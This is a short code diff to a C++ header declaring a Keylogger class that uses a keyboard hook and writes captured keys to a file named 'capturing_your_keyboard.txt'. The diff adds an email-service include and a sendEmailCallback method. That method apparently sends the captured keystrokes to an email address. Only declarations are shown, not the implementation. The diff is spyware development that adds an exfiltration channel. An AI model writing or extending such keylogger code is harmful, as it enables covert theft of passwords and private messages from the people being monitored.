@@ -1,10 +1,13 @@
 #pragma once
+
+#include "EmailService.h"
 #include "Hook.h"
 
 #include <fstream>
 #include <vector>
 #include <Psapi.h>
 #include <string>
+#include <memory>
 
 using namespace std;
 
@@ -13,8 +16,10 @@ public:
 	void start();
 	void stop();
 	~Keylogger();
+
+	bool sendEmailCallback(std::string emailTo);
 private:
-	const int BUFFER_SIZE = 10;
+	const int memoryBufferSize = 10;
 	const wstring FILENAME = L"capturing_your_keyboard.txt";
 	Hook* hook;
 	ofstream logFile;
